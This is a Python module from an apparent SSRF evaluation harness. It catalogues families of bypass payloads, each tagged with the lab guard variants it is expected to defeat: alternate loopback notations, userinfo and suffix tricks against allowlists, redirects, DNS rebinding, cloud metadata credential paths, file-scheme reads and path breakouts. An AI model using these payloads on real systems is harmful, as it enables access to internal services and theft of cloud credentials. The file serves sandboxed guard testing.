"""Bypass payload catalog.

Each entry is a *family* of concrete values that express the same idea, for
example "write the loopback address in a notation the guard did not anticipate".
One row of the result matrix is one family against one lab variant, and a cell
counts as a bypass only when a probe reached an internal target -- proven by the
target's canary marker in the body, or by a row in the target's access log for
blind variants. Getting past the guard and landing on the allowlisted public
host is not a bypass, and ``expect`` is what keeps those two outcomes apart.

``defeats`` records which guards the family is *expected* to defeat. It is a
declaration, never evidence: the harness measures what actually happened and the
evaluator prints declared against measured, because a mismatch means either the
lab or this file is wrong and both are worth knowing about.

Resolution behaviour below was measured inside the sandbox rather than assumed;
see docs/EVAL-PROTOCOL.md for the transcript.
"""
from __future__ import annotations

from dataclasses import dataclass, field

from ssrefuse import testbed_spec as spec

ADMIN = f"{spec.PORT_INTERNAL_ADMIN}/admin"
METADATA_PATH = "latest/meta-data/iam/security-credentials/"


@dataclass(frozen=True)
class Family:
    id: str
    title: str
    url_values: tuple[tuple[str, str], ...] = ()      # (url, expected marker key)
    host_values: tuple[tuple[str, str], ...] = ()     # (authority, expected marker key)
    path_values: tuple[tuple[str, str], ...] = ()     # (path suffix, expected marker key)
    defeats: tuple[str, ...] = ()
    note: str = ""
    instrument: bool = False   # evidence about reachability, not a bypass in itself


# Marker keys map to the canaries a successful probe must show.
EXPECT_MARKERS = {
    "internal": spec.MARKER_INTERNAL,
    "metadata": spec.MARKER_METADATA,
    "cgnat": spec.MARKER_CGNAT,
    "localfile": spec.MARKER_LOCALFILE,
    "benign": spec.MARKER_BENIGN,
    "oob": spec.MARKER_OOB,
}

FAMILIES: tuple[Family, ...] = (
    # ---- the mandatory control -------------------------------------------
    Family(
        id="B00_benign_allowed",
        title="benign request to the allowlisted partner host",
        url_values=((f"http://{spec.ALLOWED_HOST}/", "benign"),),
        host_values=((spec.ALLOWED_HOST, "benign"),),
        defeats=(),
        note="Positive control for the harness, not an attack. This must succeed "
             "against every variant whose guard permits the partner host. If it "
             "fails everywhere, the prober is broken and no negative result in "
             "the run can be read as a guard holding.",
    ),

    # ---- plain and alternative spellings of an internal address ----------
    Family(
        id="B01_plain_loopback",
        title="loopback address written the obvious way",
        url_values=((f"http://127.0.0.1:{ADMIN}", "internal"),),
        host_values=((f"127.0.0.1:{spec.PORT_INTERNAL_ADMIN}", "internal"),),
        defeats=("G0_none", "G9_scheme_only"),
    ),
    Family(
        id="B02_loopback_alias",
        title="shorthand and alias forms of loopback",
        url_values=(
            (f"http://127.1:{ADMIN}", "internal"),
            (f"http://0.0.0.0:{ADMIN}", "internal"),
            (f"http://127.0.0.2:{ADMIN}", "internal"),
        ),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="0.0.0.0 reaches a service bound to loopback on Linux; 127.0.0.2 is "
             "inside 127/8 but is not the string anyone denylists.",
    ),
    Family(
        id="B03_decimal_ip",
        title="loopback as a 32-bit decimal integer",
        url_values=((f"http://2130706433:{ADMIN}", "internal"),),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
    ),
    Family(
        id="B04_octal_ip",
        title="loopback with octal octets",
        url_values=((f"http://0177.0.0.1:{ADMIN}", "internal"),),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
    ),
    Family(
        id="B05_hex_ip",
        title="loopback in hexadecimal",
        url_values=((f"http://0x7f000001:{ADMIN}", "internal"),),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
    ),
    Family(
        id="B06_ipv6_loopback",
        title="IPv6 loopback and IPv4-mapped IPv6",
        url_values=(
            (f"http://[::1]:{ADMIN}", "internal"),
            (f"http://[::ffff:127.0.0.1]:{ADMIN}", "internal"),
        ),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
    ),
    Family(
        id="B07_dns_to_internal",
        title="attacker-controlled name resolving to an internal address",
        url_values=((f"http://internal.{spec.ZONE}:{ADMIN}", "internal"),),
        host_values=((f"internal.{spec.ZONE}:{spec.PORT_INTERNAL_ADMIN}", "internal"),),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="No address appears in the URL at all, so every guard that reasons "
             "about the URL as text is blind to it.",
    ),
    Family(
        id="B08_trailing_dot",
        title="fully qualified name with a trailing dot",
        url_values=(
            (f"http://internal.{spec.ZONE}.:{ADMIN}", "internal"),
            (f"http://localhost.:{ADMIN}", "internal"),
        ),
        defeats=("G2_denylist_host",),
        note="The root-anchored form is a different string but the same host. "
             "Measured: glibc does not resolve a numeric address with a trailing "
             "dot, so only the name forms are listed here.",
    ),

    # ---- defeating text-level allowlists ---------------------------------
    Family(
        id="B09_userinfo_confusion",
        title="allowlisted name demoted to a userinfo field",
        url_values=((f"http://{spec.ALLOWED_HOST}@127.0.0.1:{ADMIN}", "internal"),),
        path_values=((f"@127.0.0.1:{ADMIN}", "internal"),),
        defeats=("G3_allowlist_prefix", "G4_allowlist_substring", "G10_regex_unanchored"),
        note="Starts with the allowlisted origin and still connects to loopback. "
             "In the path-injection form the same trick ends the hostname early "
             "and turns the fixed host into a userinfo field.",
    ),
    Family(
        id="B10_subdomain_suffix",
        title="allowlisted name extended into a longer, attacker-owned name",
        url_values=((f"http://{spec.ALLOWED_HOST}.internal.{spec.ZONE}:{ADMIN}", "internal"),),
        host_values=((f"{spec.ALLOWED_HOST}.internal.{spec.ZONE}:{spec.PORT_INTERNAL_ADMIN}",
                      "internal"),),
        defeats=("G3_allowlist_prefix", "G4_allowlist_substring", "G10_regex_unanchored"),
    ),
    Family(
        id="B11_query_confusion",
        title="allowlisted name carried in the query of someone else's URL",
        url_values=((f"http://127.0.0.1:{ADMIN}?ref={spec.ALLOWED_HOST}", "internal"),),
        defeats=("G4_allowlist_substring",),
    ),
    Family(
        id="B12_fragment_confusion",
        title="allowlisted name hidden in a fragment",
        url_values=((f"http://127.0.0.1:{ADMIN}#{spec.ALLOWED_HOST}", "internal"),),
        defeats=("G4_allowlist_substring",),
        note="The fragment is never sent on the wire but a substring check sees it.",
    ),

    # ---- defeating guards that parse the URL correctly --------------------
    Family(
        id="B13_redirect",
        title="allowlisted host redirects the fetch to an internal target",
        url_values=(
            (f"http://{spec.ALLOWED_HOST}/redirect?to=http://127.0.0.1:{ADMIN}", "internal"),
            (f"http://{spec.ALLOWED_HOST}/chain?to=http://127.0.0.1:{ADMIN}&n=3", "internal"),
        ),
        defeats=("G5_allowlist_host_redirects",),
        note="The guard is a statement about the first request only.",
    ),
    Family(
        id="B14_dns_rebinding",
        title="name that answers public on the check and internal on the fetch",
        url_values=((f"http://rebind.{spec.ZONE}:{ADMIN}", "internal"),),
        defeats=("G7_resolve_check_public",),
        note="Two lookups, TTL 0, alternating answers: the validated address and "
             "the connected address are never the same one.",
    ),

    # ---- targets a guard forgot to classify as internal ------------------
    Family(
        id="B15_metadata_service",
        title="cloud metadata address",
        url_values=(
            (f"http://{spec.IP_METADATA}/{METADATA_PATH}", "metadata"),
            (f"http://metadata.{spec.ZONE}/{METADATA_PATH}", "metadata"),
        ),
        defeats=("G0_none", "G9_scheme_only", "G2_denylist_host"),
    ),
    Family(
        id="B16_cgnat_range",
        title="RFC 6598 shared address space",
        url_values=(
            (f"http://{spec.IP_CGNAT}/", "cgnat"),
            (f"http://cgnat.{spec.ZONE}/", "cgnat"),
        ),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="100.64.0.0/10 is neither private nor global, so guards written as "
             "'reject RFC 1918 and loopback' let it through.",
    ),

    # ---- non-HTTP handlers ------------------------------------------------
    Family(
        id="B17_file_scheme",
        title="file scheme on a sink that accepts arbitrary handlers",
        url_values=((f"file://{spec.SECRET_FILE}", "localfile"),),
        defeats=("G0_none",),
        note="Applies to urllib-style sinks; the requests library has no file "
             "handler, so a negative here is about the sink, not the guard.",
    ),

    # ---- blind-only oracle ------------------------------------------------
    Family(
        id="B18_oob_callback",
        title="out-of-band callback for variants that return nothing",
        url_values=((f"http://probe.oob.{spec.ZONE}/beacon", "oob"),),
        host_values=((f"probe.oob.{spec.ZONE}", "oob"),),
        defeats=(),
        instrument=True,
        note="Evidence is the DNS query and the HTTP hit recorded by the canary, "
             "which is the only oracle available when the body is discarded. "
             "This family is an instrument, not an attack: the canary sits on a "
             "globally classified address, so reaching it shows that a fetch "
             "happened and says nothing about internal access. A guard that only "
             "permits public addresses reaches it legitimately, which is why it "
             "is excluded from the bypass matrix and reported on its own.",
    ),

    # ---- encodings that usually fail, measured anyway ---------------------
    Family(
        id="B19_encoded_host",
        title="percent-encoded authority",
        url_values=((f"http://%31%32%37%2e%30%2e%30%2e%31:{ADMIN}", "internal"),),
        defeats=("G1_denylist_substring",),
        note="Included because its failure is informative: it shows the guard was "
             "not what stopped the request.",
    ),

    # ---- normalisation applied to a copy ---------------------------------
    Family(
        id="B21_decoded_delimiter",
        title="percent-encoded delimiter that only appears after decoding",
        url_values=((f"http://{spec.ALLOWED_HOST}%2f@127.0.0.1:{ADMIN}", "internal"),),
        defeats=("G11_guard_wrong_value",),
        note="Measured: urlparse reads the authority of the raw value as "
             "127.0.0.1, and the authority of the decoded value as the "
             "allowlisted host. An application that validates a decoded copy and "
             "fetches the original sees two different URLs.",
    ),

    # ---- breaking out of a path-only injection point ---------------------
    Family(
        id="B20_authority_breakout",
        title="escaping a fixed authority from the path",
        url_values=(),
        path_values=(
            (f"//127.0.0.1:{ADMIN}", "internal"),
            (f"/..//@127.0.0.1:{ADMIN}", "internal"),
            (f"\\\\127.0.0.1:{ADMIN}", "internal"),
        ),
        defeats=("G12_path_concat_unvalidated",),
        note="Only meaningful where the app builds the URL as host + path. A "
             "scheme-relative value replaces the authority outright.",
    ),
)

FAMILY_BY_ID = {f.id: f for f in FAMILIES}
CONTROL_FAMILY = "B00_benign_allowed"
INSTRUMENT_FAMILIES = {f.id for f in FAMILIES if f.instrument}
ATTACK_FAMILIES = [f.id for f in FAMILIES
                   if not f.instrument and f.id != CONTROL_FAMILY]


@dataclass(frozen=True)
class Payload:
    family: str
    value: str
    kind: str
    expect: str
    expected_marker: str


def payloads_for_kind(kind: str) -> list[Payload]:
    """Render every family for one injection shape.

    A family with no value for this shape is skipped here and reported as
    not-applicable by the prober, which counts those separately so a skipped
    row can never be read as a guard that held.
    """
    out: list[Payload] = []
    for fam in FAMILIES:
        values = {"url": fam.url_values, "host": fam.host_values,
                  "path": fam.path_values}.get(kind, ())
        for value, expect in values:
            out.append(Payload(fam.id, value, kind, expect, EXPECT_MARKERS[expect]))
    return out


def applicable_families(kind: str) -> list[str]:
    return [f.id for f in FAMILIES
            if {"url": f.url_values, "host": f.host_values,
                 "path": f.path_values}.get(kind, ())]


def summary() -> str:
    lines = [f"{len(FAMILIES)} families"]
    for kind in ("url", "host", "path"):
        payloads = payloads_for_kind(kind)
        lines.append(f"  kind={kind:5} families={len(applicable_families(kind)):2} "
                     f"concrete_values={len(payloads)}")
    return "\n".join(lines)
